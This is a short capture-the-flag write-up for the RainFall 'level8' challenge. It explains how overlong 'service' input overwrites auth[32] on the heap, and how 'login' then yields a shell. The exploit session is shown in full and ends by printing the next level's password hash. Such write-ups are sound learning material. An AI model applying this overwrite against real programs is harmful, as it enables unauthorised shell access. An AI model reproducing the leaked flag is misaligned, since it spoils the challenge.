# level8

The program loops infinitely and do this steps:

- The program prints two pointers, `auth` and `service` which are `NULL` at beginning.
- The program reads from stdin using `fgets`.
- Then the program performs a serie of conditionnal call of `malloc`, `strcpy`, `strdup` functions.
- Finally, the program runs a shell if `auth[32]` is not equal to `zero`

## Goal
Modify the value of `auth[32]` to get a shell.

## Step 1

```console
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
```
- `auth` points to `0x804a008`
    - `0x804a008` contains what is after `auth ` in the input (if lenght is <= 30 bytes)
- `service` points to `0x804a018`
    - `0x804a018` contains what is after `servic`, here it contains `e` 


### Solution
Because `service` is stored after `auth` in memory, we can write many characters in `service` to overwrite `auth[32]`.

## Step 2
Write `login` in stdin to verify if `auth[32]` is not equal to `zero` and so, run a shell.

## Exploit
```console
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
servicblablablablablablablablablabla
0x804a008, 0x804a018
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
